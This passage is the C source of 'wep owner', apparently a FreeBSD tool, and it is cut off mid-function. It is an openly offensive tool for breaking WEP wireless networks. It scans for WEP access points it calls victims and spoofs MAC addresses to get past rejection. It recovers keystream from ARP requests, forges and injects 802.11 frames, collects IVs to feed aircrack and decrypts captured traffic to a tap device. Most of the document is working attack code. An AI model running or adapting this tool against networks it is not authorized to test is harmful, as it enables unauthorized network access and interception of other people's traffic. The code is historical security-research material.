/*
 * wep owner by sorbo <sorbox@yahoo.com>
 * Aug 2005
 *
 * XXX GENERAL: I DON'T CHECK FOR PACKET LENGTHS AND STUFF LIKE THAT and buffer
 * overflows.  this whole thing is experimental n e way.
 *
 * $FreeBSD$
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/endian.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <net/if.h>
#include <net/if_media.h>
#include <net/if_llc.h>
#include <net/if_arp.h>
#include <net/if_types.h>
#include <net/if_dl.h>
#include <net/bpf.h>
#include <net/ethernet.h>
#include <net80211/ieee80211.h>
#include <net80211/ieee80211_ioctl.h>
#include <net80211/ieee80211_radiotap.h>
#include <net80211/ieee80211_freebsd.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <assert.h>
#include <zlib.h>
#include <signal.h>
#include <stdarg.h>
#include <err.h>
#include <pcap.h>

#include "aircrack-ptw-lib.h"

#define FIND_VICTIM		0
#define FOUND_VICTIM		1
#define SENDING_AUTH		2
#define GOT_AUTH		3
#define SPOOF_MAC		4
#define SENDING_ASSOC		5
#define GOT_ASSOC		6

int state = 0;

struct timeval arpsend;

struct tx_state {
	int waiting_ack;
	struct timeval tsent;
	int retries;
	unsigned int psent;
} txstate;

struct chan_info {
	int s;
	struct ieee80211req ireq;
	int chan;
} chaninfo;

struct victim_info {
	char* ssid;
	int chan;
	char bss[6];
} victim;

struct frag_state {
	struct ieee80211_frame wh;
	unsigned char* data;
	int len;
	unsigned char* ptr;
	int waiting_relay;
	struct timeval last;
} fragstate;

struct prga_info {
	unsigned char* prga;
	unsigned int len;
	unsigned char iv[3];
} prgainfo;

struct decrypt_state {
	unsigned char* cipher;
	int clen;
	struct prga_info prgainfo;
	struct frag_state fragstate;
} decryptstate;

struct wep_log {
	unsigned int packets;
	unsigned int rate;
	int fd;
	unsigned char iv[3];
} weplog;

#define LINKTYPE_IEEE802_11     105
#define TCPDUMP_MAGIC           0xA1B2C3D4

unsigned char* floodip = 0;
unsigned short floodport = 6969;
unsigned short floodsport = 53;

unsigned char* netip = 0;
int netip_arg = 0;
int max_chan = 11;

unsigned char* rtrmac = 0;

unsigned char mymac[] = "\x00\x00\xde\xfa\xce\x0d";
unsigned char myip[16] = "192.168.0.123";

int bits = 0;
int ttl_val = 0;

PTW_attackstate *ptw;

unsigned char *victim_mac = 0;

int ack_timeout = 100*1000;

#define ARPLEN (8+ 8 + 20)
unsigned char arp_clear[] = "\xAA\xAA\x03\x00\x00\x00\x08\x06";
unsigned char ip_clear[] =  "\xAA\xAA\x03\x00\x00\x00\x08\x00";
#define S_LLC_SNAP      "\xAA\xAA\x03\x00\x00\x00"
#define S_LLC_SNAP_ARP  (S_LLC_SNAP "\x08\x06")
#define S_LLC_SNAP_IP   (S_LLC_SNAP "\x08\x00")

#define MCAST_PREF "\x01\x00\x5e\x00\x00"

#define WEP_FILE "wep.cap"
#define KEY_FILE "key.log"
#define PRGA_FILE "prga.log"

unsigned int min_prga =  128;

/*
 * When starting aircrack we try first to use a
 * local copy, falling back to where the installed
 * version is expected.
 * XXX builtin pathnames
 */
#define CRACK_LOCAL_CMD "../aircrack/aircrack"
#define CRACK_INSTALL_CMD "/usr/local/bin/aircrack"

#define INCR 10000
int thresh_incr = INCR;

#define MAGIC_TTL_PAD 69

int crack_dur = 60;
int wep_thresh = INCR;
int crack_pid = 0;
struct timeval crack_start;
struct timeval real_start;

/* linksys does this.  The hardware pads small packets. */
#define PADDED_ARPLEN 54

#define PRGA_LEN (1500-14-20-8)
unsigned char inet_clear[8+20+8+PRGA_LEN+4];

#define DICT_PATH "dict"
#define TAP_DEV "/dev/tap3"
unsigned char tapdev[16];
unsigned char taptx[4096];
unsigned int taptx_len = 0;
int tapfd = -1;

/********** RIPPED
************/ 
unsigned short in_cksum (unsigned short *ptr, int nbytes) {
  register long sum;
  u_short oddbyte;
  register u_short answer;

  sum = 0;
  while (nbytes > 1)
    {
      sum += *ptr++;
      nbytes -= 2;
    }

  if (nbytes == 1)
    {
      oddbyte = 0;
      *((u_char *) & oddbyte) = *(u_char *) ptr;
      sum += oddbyte;
    }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}
/**************
************/

unsigned int udp_checksum(unsigned char *stuff, int len, struct in_addr *sip,
                          struct in_addr *dip) {
        unsigned char *tmp;
        struct ippseudo *ph;

        tmp = (unsigned char*) malloc(len + sizeof(struct ippseudo));
        if(!tmp)
		err(1, "malloc()");

        ph = (struct ippseudo*) tmp;

        memcpy(&ph->ippseudo_src, sip, 4);
        memcpy(&ph->ippseudo_dst, dip, 4);
        ph->ippseudo_pad =  0;
        ph->ippseudo_p = IPPROTO_UDP;
        ph->ippseudo_len = htons(len);

        memcpy(tmp + sizeof(struct ippseudo), stuff, len);

        return in_cksum((unsigned short*)tmp, len+sizeof(struct ippseudo));
}

void time_print(char* fmt, ...) {
        va_list ap;
        char lame[1024];
	time_t tt;
	struct tm *t;

        va_start(ap, fmt);
        vsnprintf(lame, sizeof(lame), fmt, ap);
        va_end(ap);

	tt = time(NULL);

	if (tt == (time_t)-1) {
		perror("time()");
		exit(1);
	}

	t = localtime(&tt);
	if (!t) {
		perror("localtime()");
		exit(1);
	}

	printf("[%.2d:%.2d:%.2d] %s", 
	       t->tm_hour, t->tm_min, t->tm_sec, lame);
}

void check_key() {
	char buf[1024];
	int fd;
	int rd;
	struct timeval now;

	fd = open(KEY_FILE, O_RDONLY);

	if (fd == -1) {
		return;
	}

	rd = read(fd, buf, sizeof(buf) -1);
	if (rd == -1) {
		perror("read()");
		exit(1);
	}

	buf[rd] = 0;

	close(fd);

	printf ("\n\n");
	time_print("KEY=(%s)\n", buf);

	if (gettimeofday(&now, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

	printf ("Owned in %.02f minutes\n", 
		((double) now.tv_sec - real_start.tv_sec)/60.0);
	exit(0);
}

void kill_crack() {
	if (crack_pid == 0)
		return;

	printf("\n");
	time_print("Stopping crack PID=%d\n", crack_pid);

	// XXX doesn't return -1 for some reason! [maybe on my box... so it
	// might be buggy on other boxes...]
	if (kill(crack_pid, SIGINT) == -1) {
		perror("kill()");
		exit(1);
	}

	crack_pid = 0;

	check_key();
}

void cleanup(int x) {
	time_print("\nDying...\n");

	if (weplog.fd)
		close(weplog.fd);

	kill_crack();

	exit(0);	
}

void set_chan(int c) {
	if (c == chaninfo.chan)
		return;
	
	chaninfo.ireq.i_val = c;

	if (ioctl(chaninfo.s, SIOCS80211, &chaninfo.ireq) == -1) {
		perror("ioctl(SIOCS80211) [chan]");
		exit(1);
	}
	chaninfo.chan = c;
}

void set_if_mac(unsigned char* mac, unsigned char *name) {
	int s;
	struct ifreq ifr;
	
	s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("socket()");
		exit(1);
	}

	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, name);

	ifr.ifr_addr.sa_family = AF_LINK;
	ifr.ifr_addr.sa_len = 6;
	memcpy(ifr.ifr_addr.sa_data, mac, 6);

	if (ioctl(s, SIOCSIFLLADDR, &ifr) == -1) {
		perror("ioctl(SIOCSIFLLADDR)");
		exit(1);
	}

	close(s);
}

void setup_if(char *dev) {
	int s;
	struct ifreq ifr;
	unsigned int flags;
	struct ifmediareq ifmr;
	int *mwords;

	if(strlen(dev) >= IFNAMSIZ) {
		time_print("Interface name too long...\n");
		exit(1);
	}

	time_print("Setting up %s... ", dev);
	fflush(stdout);
	
	set_if_mac(mymac, dev);

	s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("socket()");
		exit(1);
	}

	// set chan
	memset(&chaninfo.ireq, 0, sizeof(chaninfo.ireq));
	strcpy(chaninfo.ireq.i_name, dev);
	chaninfo.ireq.i_type = IEEE80211_IOC_CHANNEL;
	
	chaninfo.chan = 0;
	chaninfo.s = s;
	set_chan(1);

	// set iface up and promisc
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, dev);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) == -1) {
		perror("ioctl(SIOCGIFFLAGS)");
		exit(1);
	}

	flags = (ifr.ifr_flags & 0xffff) | (ifr.ifr_flagshigh << 16);
	flags |= IFF_UP | IFF_PPROMISC;
	
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, dev);
	ifr.ifr_flags = flags & 0xffff;
	ifr.ifr_flagshigh = flags >> 16;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) == -1) {
		perror("ioctl(SIOCSIFFLAGS)");
		exit(1);
	}

	printf("done\n");
}

int open_bpf(char *dev, int dlt) {
        int i;
        char buf[64];
        int fd = -1;
        struct ifreq ifr;

        for(i = 0;i < 16; i++) {
                sprintf(buf, "/dev/bpf%d", i);
        
                fd = open(buf, O_RDWR);
                if(fd < 0) {
                        if(errno != EBUSY) {
                                perror("can't open /dev/bpf");
                                exit(1);
                        }
                        continue;
                }
                else
                        break;
        }

        if(fd < 0) {
                perror("can't open /dev/bpf");
                exit(1);
        }

        strncpy(ifr.ifr_name, dev, sizeof(ifr.ifr_name)-1);
        ifr.ifr_name[sizeof(ifr.ifr_name)-1] = 0;

        if(ioctl(fd, BIOCSETIF, &ifr) < 0) {
                perror("ioctl(BIOCSETIF)");
                exit(1);
        }

        if (ioctl(fd, BIOCSDLT, &dlt) < 0) {
                perror("ioctl(BIOCSDLT)");
                exit(1);
        }

        i = 1;
        if(ioctl(fd, BIOCIMMEDIATE, &i) < 0) {
                perror("ioctl(BIOCIMMEDIATE)");
                exit(1);
        }

        return fd;
}

void hexdump(unsigned char *ptr, int len) {
        while(len > 0) {
                printf("%.2X ", *ptr);
                ptr++; len--;
        }
        printf("\n");
}

char* mac2str(unsigned char* mac) {
	static char ret[6*3];

	sprintf(ret, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	return ret;
}

void inject(int fd, void *buf, int len)
{
	static struct ieee80211_bpf_params params = {
		.ibp_vers = IEEE80211_BPF_VERSION,
		/* NB: no need to pass series 2-4 rate+try */
		.ibp_len = sizeof(struct ieee80211_bpf_params) - 6,
		.ibp_rate0 = 2,		/* 1 MB/s XXX */
		.ibp_try0 = 1,		/* no retransmits */
		.ibp_flags = IEEE80211_BPF_NOACK,
		.ibp_power = 100,	/* nominal max */
		.ibp_pri = WME_AC_VO,	/* high priority */
	};
	struct iovec iov[2];
	int rc;

	iov[0].iov_base = &params;
	iov[0].iov_len = params.ibp_len;
	iov[1].iov_base = buf;
	iov[1].iov_len = len;
	rc = writev(fd, iov, 2);
	if(rc == -1) {
		perror("writev()");
		exit(1);
	}
	if (rc != (len + iov[0].iov_len)) {
		time_print("Error Wrote %d out of %d\n", rc,
			   len+iov[0].iov_len);
		exit(1);
	}
}

void send_frame(int tx, unsigned char* buf, int len) {
	static unsigned char* lame = 0;
	static int lamelen = 0;
	static int lastlen = 0;

	// retransmit!
	if (len == -1) {
		txstate.retries++;

		if (txstate.retries > 10) {
			time_print("ERROR Max retransmists for (%d bytes):\n", 
			       lastlen);
			hexdump(&lame[0], lastlen);
//			exit(1);
		}
		len = lastlen;
//		printf("Warning doing a retransmit...\n");
	}
	// normal tx
	else {
		assert(!txstate.waiting_ack);
	
		if (len > lamelen) {
			if (lame)
				free(lame);
		
			lame = (unsigned char*) malloc(len);
			if(!lame) {
				perror("malloc()");
				exit(1);
			}

			lamelen = len;
		}

		memcpy(lame, buf, len);
		txstate.retries = 0;
		lastlen = len;
	}	

	inject(tx, lame, len);

	txstate.waiting_ack = 1;
	txstate.psent++;
	if (gettimeofday(&txstate.tsent, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

#if 0
	printf("Wrote frame at %lu.%lu\n", 
	       txstate.tsent.tv_sec, txstate.tsent.tv_usec);
#endif	       
}

unsigned short fnseq(unsigned short fn, unsigned short seq) {
        unsigned short r = 0;

        if(fn > 15) {
                time_print("too many fragments (%d)\n", fn);
                exit(1);
        }

        r = fn;

        r |=  ( (seq % 4096) << IEEE80211_SEQ_SEQ_SHIFT);

        return r;
}

void fill_basic(struct ieee80211_frame* wh) {
	unsigned short* sp;

	memcpy(wh->i_addr1, victim.bss, 6);
	memcpy(wh->i_addr2, mymac, 6);
	memcpy(wh->i_addr3, victim.bss, 6);

	

	sp = (unsigned short*) wh->i_seq;
	*sp = fnseq(0, txstate.psent);

	sp = (unsigned short*) wh->i_dur;
	*sp = htole16(32767);
}

void send_assoc(int tx) {
	unsigned char buf[128];
	struct ieee80211_frame* wh = (struct ieee80211_frame*) buf;
	unsigned char* body;
	int ssidlen;

	memset(buf, 0, sizeof(buf));
	fill_basic(wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ASSOC_REQ;

	body = (unsigned char*) wh + sizeof(*wh);
	*body = 1 | IEEE80211_CAPINFO_PRIVACY; // cap
	// cap + interval
	body += 2 + 2;

	// ssid
	*body++ = 0;
	ssidlen = strlen(victim.ssid);
	*body++ = ssidlen;
	memcpy(body, victim.ssid, ssidlen);
	body += ssidlen;

	// rates
	*body++ = 1;
	*body++ = 4;
	*body++ = 2;
	*body++ = 4;
	*body++ = 11;
	*body++ = 22; 

	send_frame(tx, buf, sizeof(*wh) + 2 + 2 + 2 + 
			    strlen(victim.ssid) + 2 + 4);
}

void wepify(unsigned char* body, int dlen) {
	uLong crc;
	unsigned long *pcrc;
	int i;
	
	assert(dlen + 4 <= prgainfo.len);

	// iv
	memcpy(body, prgainfo.iv, 3);
	body +=3;
	*body++ = 0;

	// crc
	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, body, dlen);
	pcrc = (unsigned long*) (body+dlen);
	*pcrc = crc;

	for (i = 0; i < dlen +4; i++)
		*body++ ^= prgainfo.prga[i];
}

void send_auth(int tx) {
	unsigned char buf[128];
	struct ieee80211_frame* wh = (struct ieee80211_frame*) buf;
	unsigned short* n;

	memset(buf, 0, sizeof(buf));
	fill_basic(wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_AUTH;

	n = (unsigned short*) ((unsigned char*) wh + sizeof(*wh));
	n++;
	*n = 1;

	send_frame(tx, buf, sizeof(*wh) + 2 + 2 + 2);
}

int get_victim_ssid(struct ieee80211_frame* wh, int len) {
	unsigned char* ptr;
	int x;
	int gots = 0, gotc = 0;

	if (len <= sizeof(*wh)) {
		time_print("Warning: short packet in get_victim_ssid()\n");
		return 0;
	}

	ptr = (unsigned char*)wh + sizeof(*wh);
	len -= sizeof(*wh);

	// only wep baby
	if ( !(IEEE80211_BEACON_CAPABILITY(ptr) & IEEE80211_CAPINFO_PRIVACY)) {
		return 0;
	}

	// we want a specific victim
	if (victim_mac) {
		if (memcmp(wh->i_addr3, victim_mac, 6) != 0)
			return 0;
	}

	// beacon header
	x = 8 + 2 + 2;
	if (len <= x) {
		time_print("Warning short.asdfasdf\n");
		return 0;
	}

	ptr += x;
	len -= x;

	// SSID
	while(len > 2) {
		int eid, elen;

		eid = *ptr;
		ptr++;
		elen = *ptr;
		ptr++;
		len -= 2;

		if (len < elen) {
			time_print("Warning short....\n");
			return 0;
		}
		
		// ssid
		if (eid == 0) {
			if (victim.ssid)
				free(victim.ssid);
		
			victim.ssid = (char*) malloc(elen + 1);
			if (!victim.ssid) {
				perror("malloc()");
				exit(1);
			}
		
			memcpy(victim.ssid, ptr, elen);
			victim.ssid[elen] = 0;
			gots = 1;

		} 
		// chan
		else if(eid == 3) {
			if( elen != 1) {
				time_print("Warning len of chan not 1\n");
				return 0;
			}

			victim.chan = *ptr;
			gotc = 1;
		}

		ptr += elen;
		len -= elen;
	}

	if (gots && gotc) {
		memcpy(victim.bss, wh->i_addr3, 6);
		set_chan(victim.chan);
		state = FOUND_VICTIM;
		time_print("Found SSID(%s) BSS=(%s) chan=%d\n", 
		       victim.ssid, mac2str(victim.bss), victim.chan);
		return 1;
	}	
	return 0;
}

void send_ack(int tx) {
	/* firmware acks */
}

void do_llc(unsigned char* buf, unsigned short type) {
	struct llc* h = (struct llc*) buf;

	memset(h, 0, sizeof(*h));
	h->llc_dsap = LLC_SNAP_LSAP;
	h->llc_ssap = LLC_SNAP_LSAP;
	h->llc_un.type_snap.control = 3;
	h->llc_un.type_snap.ether_type = htons(type);
}

void calculate_inet_clear() {
	struct ip* ih;
	struct udphdr* uh;
	uLong crc;
	unsigned long *pcrc;
	int dlen;

	memset(inet_clear, 0, sizeof(inet_clear));

	do_llc(inet_clear, ETHERTYPE_IP);

	ih = (struct ip*) &inet_clear[8];
	ih->ip_hl = 5;
	ih->ip_v = 4;
	ih->ip_tos = 0;
	ih->ip_len = htons(20+8+PRGA_LEN);
	ih->ip_id = htons(666);
	ih->ip_off = 0;
	ih->ip_ttl = ttl_val;
	ih->ip_p = IPPROTO_UDP;
	ih->ip_sum = 0;
	inet_aton(floodip, &ih->ip_src);
	inet_aton(myip, &ih->ip_dst);
	ih->ip_sum = in_cksum((unsigned short*)ih, 20);

	uh = (struct udphdr*) ((char*)ih + 20);
	uh->uh_sport = htons(floodport);
	uh->uh_dport = htons(floodsport);
	uh->uh_ulen = htons(8+PRGA_LEN);
	uh->uh_sum = 0;
        uh->uh_sum = udp_checksum((unsigned char*)uh, 8+PRGA_LEN,
                                  &ih->ip_src, &ih->ip_dst);

	// crc
	dlen = 8 + 20 + 8 + PRGA_LEN;
	assert (dlen + 4 <= sizeof(inet_clear));

	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, inet_clear, dlen);
	pcrc = (unsigned long*) (inet_clear+dlen);
	*pcrc = crc;

#if 0
	printf("INET %d\n", sizeof(inet_clear));
	hexdump(inet_clear, sizeof(inet_clear));
#endif	
}

void set_prga(unsigned char* iv, unsigned char* cipher, 
	      unsigned char* clear, int len) {

	int i;
	int fd;

	if (prgainfo.len != 0)
		free(prgainfo.prga);
	
	prgainfo.prga = (unsigned char*) malloc(len);
	if (!prgainfo.prga) {
		perror("malloc()");
		exit(1);
	}

	prgainfo.len = len;
	memcpy(prgainfo.iv, iv, 3);
	
	for (i = 0; i < len; i++) {
		prgainfo.prga[i] =  ( cipher ? (clear[i] ^ cipher[i]) :
				 	        clear[i]);
	}	

	time_print("Got %d bytes of prga IV=(%.02x:%.02x:%.02x) PRGA=", 
	       prgainfo.len, prgainfo.iv[0], prgainfo.iv[1], prgainfo.iv[2]);
	hexdump(prgainfo.prga, prgainfo.len);

	if (!cipher)
		return;

	fd = open(PRGA_FILE, O_WRONLY | O_CREAT, 
		  S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

	if (fd == -1) {
		perror("open()");
		exit(1);
	}

	i = write(fd, prgainfo.iv, 3);
	if (i == -1) {
		perror("write()");
		exit(1);
	}
	if (i != 3) {
		printf("Wrote %d out of %d\n", i, 3);
		exit(1);
	}

	i = write(fd, prgainfo.prga, prgainfo.len);
	if (i == -1) {
		perror("write()");
		exit(1);
	}
	if (i != prgainfo.len) {
		printf("Wrote %d out of %d\n", i, prgainfo.len);
		exit(1);
	}

	close(fd);
}


void log_dictionary(unsigned char* body, int len) {
	char paths[3][3];
	int i, rd;
	int fd;
	unsigned char path[128];
	unsigned char file_clear[sizeof(inet_clear)];
	unsigned char* data;

	len -= 4; // IV etc..
	assert (len == sizeof(inet_clear));

	data = body +4;
	
	if (len > prgainfo.len)
		set_prga(body, data, inet_clear, len);

	
	for (i = 0; i < 3; i++) 
		snprintf(paths[i], sizeof(paths[i]), "%.2X", body[i]);


	strcpy(path, DICT_PATH);


	// first 2 bytes
	for (i = 0; i < 2; i++) {
		strcat(path, "/");
		strcat(path, paths[i]);
		fd = open(path, O_RDONLY);
		if (fd == -1) {
			if (errno != ENOENT) {
				perror("open()");
				exit(1);
			}

			if (mkdir(path, 0755) == -1) {
				perror("mkdir()");
				exit(1);
			}
		}
		else
			close(fd);
	}

	// last byte
	strcat(path, "/");
	strcat(path, paths[2]);

	fd = open(path, O_RDWR);
	// already exists... see if we are consistent...
	if (fd != -1) {
		rd = read(fd, file_clear, sizeof(file_clear));

		if (rd == -1) {
			perror("read()");
			exit(1);
		}

		// check consistency....
		for (i = 0; i < rd; i++) {
			if (file_clear[i] != 
			    (data[i] ^ inet_clear[i])) {
			
				printf("Mismatch in byte %d for:\n", i);
				hexdump(body, len+4);
				exit(1);
			}    
		}

		// no need to log
		if (i >= sizeof(inet_clear)) {
#if 0		
			time_print("Not logging IV %.2X:%.2X:%.2X cuz we got it\n",
				body[0], body[1], body[2]);
#endif				
			close(fd);
			return;
		}
	
		// file has less... fd still open
		
	} else {
		fd = open(path, O_WRONLY | O_CREAT, 0644);
		if (fd == -1) {
			printf("Can't open (%s): %s\n", path,
			       strerror(errno));
			exit(1);
		}
	}

	assert (sizeof(file_clear) >= sizeof(inet_clear));

	for(i = 0; i < len; i++)
		file_clear[i] = data[i] ^ inet_clear[i];

	rd = write(fd, file_clear, len);
	if (rd == -1) {
		perror("write()");
		exit(1);
	}
	if (rd != len) {
		printf("Wrote %d of %d\n", rd, len);
		exit(1);
	}
	close(fd);
}

void stuff_for_us(struct ieee80211_frame* wh, int len) {
	int type,stype;
	unsigned char* body;

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	body = (unsigned char*) wh + sizeof(*wh);

	// CTL
	if (type == IEEE80211_FC0_TYPE_CTL) {
		if (stype == IEEE80211_FC0_SUBTYPE_ACK) {
			txstate.waiting_ack = 0;
			return;
		}

		if (stype == IEEE80211_FC0_SUBTYPE_RTS) {
			return;
		}

		if (stype == IEEE80211_FC0_SUBTYPE_CTS) {
			return;
		}
		time_print ("got CTL=%x\n", stype);
		return;
	}

	// MGM
	if (type == IEEE80211_FC0_TYPE_MGT) {
		if (stype == IEEE80211_FC0_SUBTYPE_DEAUTH) {
			unsigned short* rc = (unsigned short*) body;
			printf("\n");
			time_print("Got deauth=%u\n", le16toh(*rc));
			state = FOUND_VICTIM;
			return;
			exit(1);
		}
		else if (stype == IEEE80211_FC0_SUBTYPE_AUTH) {
			unsigned short* sc = (unsigned short*) body;

			if (*sc != 0) {
				time_print("Warning got auth algo=%x\n", *sc);
				exit(1);
				return;
			}
			sc++;

			if (*sc != 2) {
				time_print("Warning got auth seq=%x\n", *sc);
				return;
			}

			sc++;

			if (*sc == 1) {
				time_print("Auth rejected... trying to spoof mac.\n");
				state = SPOOF_MAC;
				return;
			}
			else if (*sc == 0) {
				time_print("Authenticated\n");
				state = GOT_AUTH;
				return;
			}
			else {
				time_print("Got auth %x\n", *sc);
				exit(1);
			}	
		}
		else if (stype == IEEE80211_FC0_SUBTYPE_ASSOC_RESP) {
			unsigned short* sc = (unsigned short*) body;
			sc++; // cap

			if (*sc == 0) {
				sc++;
				unsigned int aid = le16toh(*sc) & 0x3FFF;
				time_print("Associated (ID=%x)\n", aid);
				state = GOT_ASSOC;
				return;
		        } else if (*sc == 12) {
                                time_print("Assoc rejected..."
                                           " trying to spoof mac.\n");
                                state = SPOOF_MAC;
                                return;
			} else {
				time_print("got assoc %x\n", *sc);
				exit(1);
			}
		} else if (stype == IEEE80211_FC0_SUBTYPE_PROBE_RESP) {
			return;
		}

		time_print("\nGOT MAN=%x\n", stype);
		exit(1);
	}

	if (type == IEEE80211_FC0_TYPE_DATA && 
	    stype == IEEE80211_FC0_SUBTYPE_DATA) {
		int dlen;
		dlen = len - sizeof(*wh) - 4 -4;

		if (!( wh->i_fc[1] & IEEE80211_FC1_PROTECTED)) {
			time_print("WARNING: Got NON wep packet from %s dlen %d stype=%x\n",
				   mac2str(wh->i_addr2), dlen, stype);
				   return;
		}

		assert (wh->i_fc[1] & IEEE80211_FC1_PROTECTED);

		if ((dlen == 36 || dlen == PADDED_ARPLEN) && rtrmac == (unsigned char*) 1) {
			rtrmac = (unsigned char *) malloc(6);
			if (!rtrmac) {
				perror("malloc()");
				exit(1);
			}

			assert( rtrmac > (unsigned char*) 1);

			memcpy (rtrmac, wh->i_addr3, 6);
			time_print("Got arp reply from (%s)\n", mac2str(rtrmac));

			return;
		}
#if 0
		// check if its a TTL update from dictionary stuff
		if (dlen >= (8+20+8+MAGIC_TTL_PAD) && 
		    dlen <= (8+20+8+MAGIC_TTL_PAD+128)) {
			int ttl_delta, new_ttl;
			
			ttl_delta = dlen - 8 - 20 - 8 - MAGIC_TTL_PAD;
			new_ttl = 128 - ttl_delta;

			if (ttl_val && new_ttl != ttl_val) {
				time_print("oops. ttl changed from %d to %d\n",
					   ttl_val, new_ttl);
				exit(1);	   
			}

			if (!ttl_val) {
				ttl_val = new_ttl;
				printf("\n");
				time_print("Got TTL of %d\n", ttl_val);
				calculate_inet_clear();
			}
		}

		// check if its dictionary data
		if (ttl_val && dlen == (8+20+8+PRGA_LEN)) {
			log_dictionary(body, len - sizeof(*wh));
		}
#endif		
	}

#if 0
	printf ("Got frame for us (type=%x stype=%x) from=(%s) len=%d\n",
		type, stype, mac2str(wh->i_addr2), len);
#endif		
}

void decrypt_arpreq(struct ieee80211_frame* wh, int rd) {
	unsigned char* body;
	int bodylen;
	unsigned char clear[36];
	unsigned char* ptr;
	struct arphdr* h;
	int i;

	body = (unsigned char*) wh+sizeof(*wh);
	ptr = clear;

	// calculate clear-text
	memcpy(ptr, arp_clear, sizeof(arp_clear)-1);
	ptr += sizeof(arp_clear) -1;
	
	h = (struct arphdr*)ptr;
	h->ar_hrd = htons(ARPHRD_ETHER);
        h->ar_pro = htons(ETHERTYPE_IP);
        h->ar_hln = 6;
        h->ar_pln = 4;
        h->ar_op = htons(ARPOP_REQUEST);
	ptr += sizeof(*h);

	memcpy(ptr, wh->i_addr3, 6);

	bodylen = rd - sizeof(*wh) - 4 - 4;
	decryptstate.clen = bodylen;
	decryptstate.cipher = (unsigned char*) malloc(decryptstate.clen);
	if (!decryptstate.cipher) {
		perror("malloc()");
		exit(1);
	}
	decryptstate.prgainfo.prga = (unsigned char*) malloc(decryptstate.clen);
	if (!decryptstate.prgainfo.prga) {
		perror("malloc()");
		exit(1);
	}


	memcpy(decryptstate.cipher, &body[4], decryptstate.clen);
	memcpy(decryptstate.prgainfo.iv, body, 3);

	memset(decryptstate.prgainfo.prga, 0, decryptstate.clen);
	for(i = 0; i < (8+8+6); i++) {
		decryptstate.prgainfo.prga[i] = decryptstate.cipher[i] ^ 
						clear[i];
	}
	
	decryptstate.prgainfo.len = i;
	time_print("Got ARP request from (%s)\n", mac2str(wh->i_addr3));
}

void log_wep(struct ieee80211_frame* wh, int len) {
	int rd;
	struct pcap_pkthdr pkh;
	struct timeval tv;
	unsigned char *body = (unsigned char*) (wh+1);

	memset(&pkh, 0, sizeof(pkh));
	pkh.caplen = pkh.len = len;
	if (gettimeofday(&tv, NULL) == -1)
		err(1, "gettimeofday()");
	pkh.ts = tv;
	if (write(weplog.fd, &pkh, sizeof(pkh)) != sizeof(pkh))
		err(1, "write()");

	rd = write(weplog.fd, wh, len);

	if (rd == -1) {
		perror("write()");
		exit(1);
	}
	if (rd != len) {
		time_print("short write %d out of %d\n", rd, len);
		exit(1);
	}

#if 0
	if (fsync(weplog.fd) == -1) {
		perror("fsync()");
		exit(1);
	}
#endif

	memcpy(weplog.iv, body, 3);
	weplog.packets++;
}

void try_dictionary(struct ieee80211_frame* wh, int len) {
	unsigned char *body;
	char path[52];
	char paths[3][3];
	int i;
	int fd, rd;
	unsigned char packet[4096];
	int dlen;
	struct ether_header* eh;
	uLong crc;
	unsigned long *pcrc;
	unsigned char* dmac, *smac;

	assert (len < sizeof(packet) + sizeof(*eh));

	body = (unsigned char*) wh + sizeof(*wh);

	for (i = 0; i < 3; i++)
		snprintf(paths[i], sizeof(paths[i]), "%.2X", body[i]);

	sprintf(path, "%s/%s/%s/%s", DICT_PATH, paths[0], paths[1], paths[2]);

	fd = open(path, O_RDONLY);
	if (fd == -1)
		return;

	rd = read(fd, &packet[6], sizeof(packet)-6);
	if (rd == -1) {
		perror("read()");
		exit(1);
	}
	close(fd);


	dlen = len - sizeof(*wh) - 4;
	if (dlen > rd) {
		printf("\n");
		time_print("Had PRGA (%s) but too little (%d/%d)\n", path, rd,
		dlen);
		return;
	}

	body += 4;
	for (i = 0; i < dlen; i++)
		packet[6+i] ^= body[i];

	dlen -= 4;
	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, &packet[6], dlen);
	pcrc = (unsigned long*) (&packet[6+dlen]);

	if (*pcrc != crc) {
		printf("\n");
		time_print("HAD PRGA (%s) checksum mismatch! (%x %x)\n",
			   path, *pcrc, crc);
		return;
	}

	// fill ethernet header
	eh = (struct ether_header*) packet;
	if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		smac = wh->i_addr3;
	else
		smac = wh->i_addr2;

	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
		dmac = wh->i_addr3;
	else
		dmac = wh->i_addr1;

	memcpy(eh->ether_dhost, dmac, 6);
	memcpy(eh->ether_shost, smac, 6);
	// ether type should be there from llc

	dlen -= 8; // llc
	dlen += sizeof(*eh);

#if 0
	printf("\n");
	time_print("Decrypted packet [%d bytes]!!! w00t\n", dlen);
	hexdump(packet, dlen);
#endif

	rd = write(tapfd, packet, dlen);
	if (rd == -1) {
		perror("write()");
		exit(1);
	}
	if (rd != dlen) {
